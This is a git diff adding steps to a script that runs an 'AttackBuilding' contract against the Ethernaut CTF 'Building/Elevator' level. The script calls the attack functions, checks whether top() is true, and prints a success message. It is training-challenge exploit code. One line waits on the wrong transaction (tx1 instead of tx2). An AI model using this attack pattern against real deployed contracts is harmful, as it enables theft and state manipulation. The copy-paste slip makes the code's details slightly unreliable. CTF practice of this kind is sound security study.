@@ -37,6 +37,19 @@ const attackBuilding = async () => {
     ];
     const attack = await ethers.getContract("AttackBuilding");
     const contract = await ethers.getContractAt(ABI, buildingAddress);
+    const tx1 = await attack.isLastFloor();
+    const tx1Receipt = await tx1.wait();
+    console.log(tx1Receipt);
+    const tx2 = await attack.goToTop();
+    const tx2Receipt = await tx1.wait();
+    console.log(tx2Receipt);
+    const success = await contract.top();
+    console.log(`Top: ${success}`);
+    if (success) {
+        console.log("Congrats! Submit to ethernaut.");
+    } else {
+        console.log("Sorry, review code and try again...");
+    }
 };
 
 attackBuilding()
